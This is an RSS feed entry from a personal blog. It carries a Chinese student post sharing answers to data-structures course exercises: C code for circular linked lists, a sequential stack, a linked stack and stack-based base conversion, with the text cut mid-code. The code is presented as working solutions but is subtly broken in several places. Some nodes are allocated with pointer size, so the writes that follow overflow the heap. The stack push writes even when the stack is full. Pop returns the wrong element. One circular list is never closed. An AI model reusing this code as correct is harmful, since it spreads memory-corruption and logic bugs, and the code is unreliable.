<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Los-Kos</title>
    <link>https://www.los-kos.cn/</link>
    
    <atom:link href="/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description></description>
    <pubDate>Sat, 13 Jun 2020 09:24:19 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>educoder课设作业</title>
      <link>https://www.los-kos.cn/posts/educoder/</link>
      <guid>https://www.los-kos.cn/posts/educoder/</guid>
      <pubDate>Sun, 07 Jun 2020 10:05:34 GMT</pubDate>
      <description>
      
        大一下课程设计
      
      </description>
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><div class="note success">    <p>        首先说明一下，这篇文章里面的代码均是本校同班或同系几个大佬所写，这里手动@大佬们，我只是一个弱弱的         ctrl cv工程师 QAQ<br>再次感谢他们(●'◡'●)    </p></div><div class="note info">    <p>        因为今年疫情原因，没有回学校，当然课设也得线上做，有几个同学朋友问了我课设怎么做，我就在这里整理一        下，把课设里面的编程题贴一贴代码。<br>首先呢，我们的课设是在<a href="https://www.educoder.net/" target="_blank" rel="noopener">educoder</a>平台做的，平时编程练习也是在里面，说到它吧，总有点想口吐芬芳。emm算了，挺好一平台，言归正传    </p></div><h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><p>先来看看题目要求：每人至少完成算法设计题四道，其中线性表选1题，栈、队列和串选1题，树、二叉树和图选1题，查找和排序中选1题，每题</p><p>下设有2关以上，每道题至少完成2关。</p><p>因为在<a href="https://www.educoder.net/" target="_blank" rel="noopener">educoder</a>里面分了好几组，比如1-2,3-4，每一组里面有至少2道题目，这里我选择的是以下4组：</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="1-6-循环单链表操作"><a href="#1-6-循环单链表操作" class="headerlink" title="1-6  循环单链表操作"></a>1-6  循环单链表操作</h3><h4 id="1-6-1-单循环链表的创建及遍历"><a href="#1-6-1-单循环链表的创建及遍历" class="headerlink" title="1-6-1  单循环链表的创建及遍历"></a>1-6-1  单循环链表的创建及遍历</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>    </span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>  * <span class="title">next</span>;</span></span><br><span class="line">}Node, *LinkList;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitCLinkList</span><span class="params">(LinkList *first)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    *first = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    (*first)-&gt;next = *first;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateCLinkList</span><span class="params">(LinkList first)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    Node *rear,*s;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    rear = first; </span><br><span class="line">    c = getchar(); </span><br><span class="line">    <span class="keyword">while</span>(c != <span class="string">'$'</span>)</span><br><span class="line">    {</span><br><span class="line">       <span class="comment">/*************Begin****************/</span></span><br><span class="line">    s = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkList));</span><br><span class="line">    s-&gt;data = c;</span><br><span class="line">    s-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">rear-&gt;next = s;</span><br><span class="line">    rear = s;</span><br><span class="line">    c = getchar();</span><br><span class="line">       <span class="comment">/*************End******************/</span></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintCLinkList</span><span class="params">(LinkList first)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    Node *p;</span><br><span class="line">    p = first-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p != <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%c "</span>,p-&gt;data);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    LinkList myLL;</span><br><span class="line">    InitCLinkList(&amp;myLL);</span><br><span class="line">    CreateCLinkList(myLL);</span><br><span class="line">    PrintCLinkList(myLL);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="1-6-2-两个带头结点的单循环链表的合并"><a href="#1-6-2-两个带头结点的单循环链表的合并" class="headerlink" title="1-6-2  两个带头结点的单循环链表的合并"></a>1-6-2  两个带头结点的单循环链表的合并</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>    </span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>  * <span class="title">next</span>;</span></span><br><span class="line">}Node, *LinkList;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitCLinkList</span><span class="params">(LinkList *first)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    *first = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    (*first)-&gt;next = *first;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateCLinkList</span><span class="params">(LinkList first)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    Node *rear,*s;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    rear = first; </span><br><span class="line">    c=getchar(); </span><br><span class="line">    <span class="keyword">while</span>(c != <span class="string">'$'</span>)</span><br><span class="line">    {</span><br><span class="line">        s = (Node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">        s-&gt;data = c;</span><br><span class="line">        rear-&gt;next = s;</span><br><span class="line">        rear = s;</span><br><span class="line">        c = getchar();</span><br><span class="line">    }</span><br><span class="line">    c = getchar();</span><br><span class="line">    rear-&gt;next = first;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintCLinkList</span><span class="params">(LinkList first)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    Node *p;</span><br><span class="line">    p = first-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p != first)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%c "</span>,p-&gt;data);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="function">LinkList <span class="title">merge</span><span class="params">(LinkList LA,LinkList LB)</span></span></span><br><span class="line"><span class="function"></span>{  </span><br><span class="line"><span class="comment">/*******************Begin******************/</span></span><br><span class="line">LinkList p,q;</span><br><span class="line">p = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">q = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">p = LA,q = LB;</span><br><span class="line"><span class="keyword">while</span>(p-&gt;next != LA)</span><br><span class="line">{</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">while</span>(q-&gt;next != LB)</span><br><span class="line">{</span><br><span class="line">q = q-&gt;next;</span><br><span class="line">}</span><br><span class="line">p-&gt;next = LB-&gt;next;</span><br><span class="line">q-&gt;next = LA;</span><br><span class="line"><span class="keyword">return</span> LA;</span><br><span class="line">    <span class="comment">/*****************End*********************/</span></span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    LinkList myLL,yourLL,mergeLL;</span><br><span class="line">    InitCLinkList(&amp;myLL);</span><br><span class="line">    CreateCLinkList(myLL);</span><br><span class="line">    InitCLinkList(&amp;yourLL);</span><br><span class="line">    CreateCLinkList(yourLL);</span><br><span class="line">    mergeLL = merge(myLL,yourLL);</span><br><span class="line">    PrintCLinkList(mergeLL);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><div class="note warning">    <p>        这里说明一下，下面的题目只是题目显示出来的部分内容，还有一些像"Main.cpp、Stack.cpp、binary_tree.h..."的文件我没有贴出来，想要的话在下面留言我私信。    </p></div><h3 id="2-1-栈基本运算的实现及其应用"><a href="#2-1-栈基本运算的实现及其应用" class="headerlink" title="2-1  栈基本运算的实现及其应用"></a>2-1  栈基本运算的实现及其应用</h3><h4 id="2-1-1-顺序栈的实现"><a href="#2-1-1-顺序栈的实现" class="headerlink" title="2-1-1  顺序栈的实现"></a>2-1-1  顺序栈的实现</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"SeqStack.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SS_Initiate</span><span class="params">(SqStack &amp;S)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">S.elem = (ElemType*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(ElemType)*MAXSIZE);</span><br><span class="line">S.top = <span class="number">-1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SS_Free</span><span class="params">(SqStack &amp;S)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="built_in">free</span>(S.elem);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">SS_IsEmpty</span><span class="params">(SqStack S)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">return</span> S.top==<span class="number">-1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">SS_IsFull</span><span class="params">(SqStack S)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">return</span> S.top==MAXSIZE<span class="number">-1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SS_Print</span><span class="params">(SqStack S)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">if</span>(SS_IsEmpty(S)) </span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"stack data: Empty!\n"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"stack data (from bottom to top):"</span>);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=S.top;i++)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %d"</span>, S.elem[i]);</span><br><span class="line">}</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SS_Push</span><span class="params">(SqStack &amp;S, ElemType e)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"></span><br><span class="line">    <span class="comment">/********** Begin *********/</span></span><br><span class="line"><span class="keyword">if</span>(S.top==MAXSIZE) </span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"栈已满，无法入栈\n"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">S.top++;</span><br><span class="line">}</span><br><span class="line">S.elem[S.top] = e;</span><br><span class="line">    <span class="comment">/********** End **********/</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SS_Pop</span><span class="params">(SqStack &amp;S, ElemType &amp;e)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">/********** Begin *********/</span></span><br><span class="line"><span class="keyword">if</span>(SS_IsEmpty(S))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> {</span><br><span class="line"> e = S.elem[--S.top];</span><br><span class="line">}  </span><br><span class="line">    <span class="comment">/********** End **********/</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SS_Top</span><span class="params">(SqStack S, ElemType &amp;e)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">/********** Begin *********/</span></span><br><span class="line"><span class="keyword">if</span>(!SS_IsEmpty(S))</span><br><span class="line">{</span><br><span class="line">e = S.elem[S.top];</span><br><span class="line">}</span><br><span class="line"><span class="comment">/********** End **********/</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="2-1-2-链栈的实现"><a href="#2-1-2-链栈的实现" class="headerlink" title="2-1-2  链栈的实现"></a>2-1-2  链栈的实现</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"LinkStack.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LS_Initiate</span><span class="params">(LinkStack &amp;S)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    S = <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LS_Free</span><span class="params">(LinkStack &amp;S)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    StackNode *curr,*next; </span><br><span class="line">curr = S;</span><br><span class="line">    <span class="keyword">while</span>(curr) </span><br><span class="line">{</span><br><span class="line">        next = curr-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(curr);</span><br><span class="line">        curr = next;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">LS_IsEmpty</span><span class="params">(LinkStack S)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">return</span> S==<span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LS_Length</span><span class="params">(LinkStack S)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">StackNode *p; <span class="keyword">int</span> n;</span><br><span class="line">p = S;</span><br><span class="line">n = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(p)</span><br><span class="line">{</span><br><span class="line">n++;</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LS_Print</span><span class="params">(LinkStack S)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">StackNode *p; </span><br><span class="line">    <span class="keyword">if</span>(LS_IsEmpty(S))</span><br><span class="line">{ </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"The stack: Empty!"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The stack (from top to bottom):"</span>);</span><br><span class="line">    <span class="keyword">for</span>(p = S;p;p = p-&gt;next)</span><br><span class="line">    {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">" %d"</span>, p-&gt;data);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LS_Push</span><span class="params">(LinkStack &amp;S, ElemType e)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">/********** Begin *********/</span></span><br><span class="line">LinkStack p; </span><br><span class="line">p = (LinkStack)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkStack));</span><br><span class="line">p-&gt;data = e;</span><br><span class="line">p-&gt;next = S;</span><br><span class="line">S = p;</span><br><span class="line">    <span class="comment">/********** End **********/</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LS_Pop</span><span class="params">(LinkStack &amp;S, ElemType &amp;e)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">/********** Begin *********/</span></span><br><span class="line">    LinkStack p;</span><br><span class="line">    p = (LinkStack)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkStack));</span><br><span class="line"><span class="keyword">if</span>(LS_IsEmpty(S)) <span class="keyword">return</span>;</span><br><span class="line">e = S-&gt;data;</span><br><span class="line">p = S; </span><br><span class="line">S = S-&gt;next; </span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">    <span class="comment">/********** End **********/</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LS_Top</span><span class="params">(LinkStack S, ElemType &amp;e)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">/********** Begin *********/</span></span><br><span class="line"><span class="keyword">if</span>(S!=<span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line">e=S-&gt;data;</span><br><span class="line">}</span><br><span class="line">    <span class="comment">/********** End **********/</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="2-1-3-利用栈实现数制转换"><a href="#2-1-3-利用栈实现数制转换" class="headerlink" title="2-1-3  利用栈实现数制转换"></a>2-1-3  利用栈实现数制转换</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"SeqStack.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SS_Initiate</span><span class="params">(SqStack &amp;S)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">S.elem = (ElemType*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(ElemType)*MAXSIZE);</span><br><span class="line">S.top = <span class="number">-1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">SS_IsEmpty</span><span class="params">(SqStack S)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">return</span> S.top==<span class="number">-1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">SS_IsFull</span><span class="params">(SqStack S)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">return</span> S.top==MAXSIZE<span class="number">-1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SS_Push</span><span class="params">(SqStack &amp;S, ElemType e)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span>(SS_IsFull(S)) <span class="keyword">return</span>;</span><br><span class="line">S.top++; </span><br><span 